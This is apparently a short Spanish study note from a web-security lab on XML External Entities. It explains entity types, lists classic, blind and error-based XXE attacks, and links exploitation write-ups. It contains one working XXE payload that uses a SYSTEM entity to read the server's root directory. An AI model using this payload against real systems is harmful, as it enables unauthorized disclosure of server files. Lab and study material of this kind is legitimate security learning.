# XML External Entities (XXE)

## ¿Qué son?
Definición de etiquetas que serán reemplazadas al leer un XML. Hay 3 tipos.
+ entidades internas
+ entidades externas
+ entidades de parámetros

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

En todos los lugares que se utiliza `&js;` el analizador lo reemplazará.

## Tipos de ataques XXE
+ Clásico: en este caso, se incluye una entidad externa en un DTD local
+ Ciego: no se muestran resultados ni errores en la respuesta
+ Error: intente obtener el contenido de un recurso en el mensaje de error

*********************************************************************

# Let's try (3)
```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY xxe SYSTEM "/">
]>
<comment><text>&xxe;</text></comment>
```

*********************************************************************

# Modern REST framework

*********************************************************************

# Referencias interesantes
+ https://enciphers.com/how-to-exploit-xxe-vulnerabilities/
+ https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
+ https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/